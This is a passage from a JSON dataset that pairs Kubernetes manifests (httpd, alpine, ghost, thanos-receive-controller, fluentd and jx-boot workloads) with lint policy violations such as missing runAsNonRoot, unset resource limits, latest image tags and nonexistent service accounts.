    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: another-httpd\n  namespace: default\n  labels:\n    name: httpd\nspec:\n  containers:\n  - name: httpd\n    image: quay.io/cybozu/testhttpd:0\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"httpd\" does not have a read-only root file system"
  },
  {
    "id": "10409",
    "manifest_path": "data/manifests/the_stack_sample/sample_4014.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: another-httpd\n  namespace: default\n  labels:\n    name: httpd\nspec:\n  containers:\n  - name: httpd\n    image: quay.io/cybozu/testhttpd:0\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"httpd\" is not set to runAsNonRoot"
  },
  {
    "id": "10410",
    "manifest_path": "data/manifests/the_stack_sample/sample_4014.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: another-httpd\n  namespace: default\n  labels:\n    name: httpd\nspec:\n  containers:\n  - name: httpd\n    image: quay.io/cybozu/testhttpd:0\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"httpd\" has cpu request 0"
  },
  {
    "id": "10411",
    "manifest_path": "data/manifests/the_stack_sample/sample_4014.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: another-httpd\n  namespace: default\n  labels:\n    name: httpd\nspec:\n  containers:\n  - name: httpd\n    image: quay.io/cybozu/testhttpd:0\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"httpd\" has memory limit 0"
  },
  {
    "id": "10412",
    "manifest_path": "data/manifests/the_stack_sample/sample_4015.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample\n  template:\n    metadata:\n      labels:\n        app: sample\n    spec:\n      containers:\n      - command:\n        - sleep\n        - inf\n        image: alpine:3.14.2\n        name: alpine\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10413",
    "manifest_path": "data/manifests/the_stack_sample/sample_4015.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample\n  template:\n    metadata:\n      labels:\n        app: sample\n    spec:\n      containers:\n      - command:\n        - sleep\n        - inf\n        image: alpine:3.14.2\n        name: alpine\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alpine\" does not have a read-only root file system"
  },
  {
    "id": "10414",
    "manifest_path": "data/manifests/the_stack_sample/sample_4015.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample\n  template:\n    metadata:\n      labels:\n        app: sample\n    spec:\n      containers:\n      - command:\n        - sleep\n        - inf\n        image: alpine:3.14.2\n        name: alpine\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alpine\" is not set to runAsNonRoot"
  },
  {
    "id": "10415",
    "manifest_path": "data/manifests/the_stack_sample/sample_4015.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample\n  template:\n    metadata:\n      labels:\n        app: sample\n    spec:\n      containers:\n      - command:\n        - sleep\n        - inf\n        image: alpine:3.14.2\n        name: alpine\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alpine\" has cpu request 0"
  },
  {
    "id": "10416",
    "manifest_path": "data/manifests/the_stack_sample/sample_4015.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sample\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: sample\n  template:\n    metadata:\n      labels:\n        app: sample\n    spec:\n      containers:\n      - command:\n        - sleep\n        - inf\n        image: alpine:3.14.2\n        name: alpine\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alpine\" has memory limit 0"
  },
  {
    "id": "10417",
    "manifest_path": "data/manifests/the_stack_sample/sample_4016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    app: ghost\n    app-purpose: chaos\n  name: ghost\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ghost\n  template:\n    metadata:\n      labels:\n        app: ghost\n        app-purpose: chaos\n    spec:\n      containers:\n      - image: ghost:3.11.0-alpine\n        name: ghost\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "10418",
    "manifest_path": "data/manifests/the_stack_sample/sample_4016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    app: ghost\n    app-purpose: chaos\n  name: ghost\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ghost\n  template:\n    metadata:\n      labels:\n        app: ghost\n        app-purpose: chaos\n    spec:\n      containers:\n      - image: ghost:3.11.0-alpine\n        name: ghost\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ghost\" does not have a read-only root file system"
  },
  {
    "id": "10419",
    "manifest_path": "data/manifests/the_stack_sample/sample_4016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    app: ghost\n    app-purpose: chaos\n  name: ghost\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ghost\n  template:\n    metadata:\n      labels:\n        app: ghost\n        app-purpose: chaos\n    spec:\n      containers:\n      - image: ghost:3.11.0-alpine\n        name: ghost\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ghost\" is not set to runAsNonRoot"
  },
  {
    "id": "10420",
    "manifest_path": "data/manifests/the_stack_sample/sample_4016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    app: ghost\n    app-purpose: chaos\n  name: ghost\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ghost\n  template:\n    metadata:\n      labels:\n        app: ghost\n        app-purpose: chaos\n    spec:\n      containers:\n      - image: ghost:3.11.0-alpine\n        name: ghost\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ghost\" has cpu request 0"
  },
  {
    "id": "10421",
    "manifest_path": "data/manifests/the_stack_sample/sample_4016.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    app: ghost\n    app-purpose: chaos\n  name: ghost\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: ghost\n  template:\n    metadata:\n      labels:\n        app: ghost\n        app-purpose: chaos\n    spec:\n      containers:\n      - image: ghost:3.11.0-alpine\n        name: ghost\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ghost\" has memory limit 0"
  },
  {
    "id": "10422",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (thanos-receive-controller), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "10423",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"thanos-receive-controller\" is using an invalid container image, \"quay.io/observatorium/thanos-receive-controller:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10424",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"thanos-receive-controller\" does not have a read-only root file system"
  },
  {
    "id": "10425",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"thanos-receive-controller\" not found"
  },
  {
    "id": "10426",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"thanos-receive-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "10427",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"thanos-receive-controller\" has cpu request 0"
  },
  {
    "id": "10428",
    "manifest_path": "data/manifests/the_stack_sample/sample_4018.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: thanos-receive-controller\n  name: thanos-receive-controller\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: thanos-receive-controller\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: thanos-receive-controller\n    spec:\n      containers:\n      - args:\n        - --configmap-name=observatorium-tenants\n        - --configmap-generated-name=observatorium-tenants-generated\n        - --file-name=hashrings.json\n        - --namespace=$(NAMESPACE)\n        env:\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: quay.io/observatorium/thanos-receive-controller:latest\n        name: thanos-receive-controller\n        ports:\n        - containerPort: 8080\n          name: http\n      serviceAccount: thanos-receive-controller\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"thanos-receive-controller\" has memory limit 0"
  },
  {
    "id": "10429",
    "manifest_path": "data/manifests/the_stack_sample/sample_4019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: skydive-test-daemonset\n  namespace: kube-system\n  labels:\n    k8s-app: skydive-test-daemonset-fluentd-logging\nspec:\n  selector:\n    matchLabels:\n      name: skydive-test-daemonset-fluentd-elasticsearch\n  template:\n    metadata:\n      labels:\n        name: skydive-test-daemonset-fluentd-elasticsearch\n    spec:\n      containers:\n      - name: skydive-test-daemonset-fluentd-elasticsearch\n        image: k8s.gcr.io/fluentd-elasticsearch:1.20\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: skydive-test-daemonset-varlog\n          mountPath: /var/log\n        - name: skydive-test-daemonset-varlibdockercontainers\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n      volumes:\n      - name: skydive-test-daemonset-varlog\n        hostPath:\n          path: /var/log\n      - name: skydive-test-daemonset-varlibdockercontainers\n        hostPath:\n          path: /var/lib/docker/containers\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"skydive-test-daemonset-fluentd-elasticsearch\" does not have a read-only root file system"
  },
  {
    "id": "10430",
    "manifest_path": "data/manifests/the_stack_sample/sample_4019.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: skydive-test-daemonset\n  namespace: kube-system\n  labels:\n    k8s-app: skydive-test-daemonset-fluentd-logging\nspec:\n  selector:\n    matchLabels:\n      name: skydive-test-daemonset-fluentd-elasticsearch\n  template:\n    metadata:\n      labels:\n        name: skydive-test-daemonset-fluentd-elasticsearch\n    spec:\n      containers:\n      - name: skydive-test-daemonset-fluentd-elasticsearch\n        image: k8s.gcr.io/fluentd-elasticsearch:1.20\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 200Mi\n        volumeMounts:\n        - name: skydive-test-daemonset-varlog\n          mountPath: /var/log\n        - name: skydive-test-daemonset-varlibdockercontainers\n          mountPath: /var/lib/docker/containers\n          readOnly: true\n      volumes:\n      - name: skydive-test-daemonset-varlog\n        hostPath:\n          path: /var/log\n      - name: skydive-test-daemonset-varlibdockercontainers\n        hostPath:\n          path: /var/lib/docker/containers\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"skydive-test-daemonset-fluentd-elasticsearch\" is not set to runAsNonRoot"
  },
  {
    "id": "10431",
    "manifest_path": "data/manifests/the_stack_sample/sample_4021.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: frontend\nspec:\n  selector:\n    app: sample\n    tier: frontend\n  ports:\n  - port: 8080\n    targetPort: 80\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:sample tier:frontend])"
  },
  {
    "id": "10432",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "10433",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"git-clone\" does not have a read-only root file system"
  },
  {
    "id": "10434",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "10435",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"jx-boot-job\" not found"
  },
  {
    "id": "10436",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  labels:\n    app: jx-boot\n    jenkins-x.io/kind: jx-git-operator\nspec:\n  template:\n    metadata:\n      labels:\n        app: jx-boot\n        jenkins-x.io/kind: jx-git-operator\n    spec:\n      initContainers:\n      - args:\n        - -c\n        - 'mkdir -p $HOME; git config --global --add user.name $GIT_AUTHOR_NAME; git\n          config --global --add user.email $GIT_AUTHOR_EMAIL; git config --global\n          credential.helper store; git clone https://${GIT_USER}:${GIT_TOKEN}@${GIT_URL#\"https://\"}\n          ${GIT_SUB_DIR}; echo cloned url: $(inputs.params.url) to dir: ${GIT_SUB_DIR};\n          cd ${GIT_SUB_DIR}; git checkout ${GIT_REVISION}; echo checked out revision:\n          ${GIT_REVISION} to dir: ${GIT_SUB_DIR}'\n        command:\n        - /bin/sh\n        env:\n        - name: GIT_URL\n          valueFrom:\n            secretKeyRef:\n              key: url\n              name: jx-boot\n        - name: GIT_USER\n          valueFrom:\n            secretKeyRef:\n              key: username\n              name: jx-boot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: password\n              name: jx-boot\n        - name: GIT_REVISION\n          value: master\n        - name: GIT_SUB_DIR\n          value: source\n        - name: GIT_AUTHOR_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_AUTHOR_NAME\n          value: jenkins-x-labs-bot\n        - name: GIT_COMMITTER_EMAIL\n          value: jenkins-x@googlegroups.com\n        - name: GIT_COMMITTER_NAME\n          value: jenkins-x-labs-bot\n        - name: XDG_CONFIG_HOME\n          value: /workspace/xdg_config\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        name: git-clone\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace\n      containers:\n      - args:\n        - apply\n        command:\n        - make\n        image: gcr.io/jenkinsxio/jx-cli:3.0.84\n        imagePullPolicy: Always\n        name: job\n        volumeMounts:\n        - mountPath: /workspace\n          name: workspace-volume\n        workingDir: /workspace/source\n      serviceAccountName: jx-boot-job\n      volumes:\n      - name: workspace-volume\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"git-clone\" is not set to runAsNonRoot"
  },
  {
    "id": "10437",
    "manifest_path": "data/manifests/the_stack_sample/sample_4023.yaml",
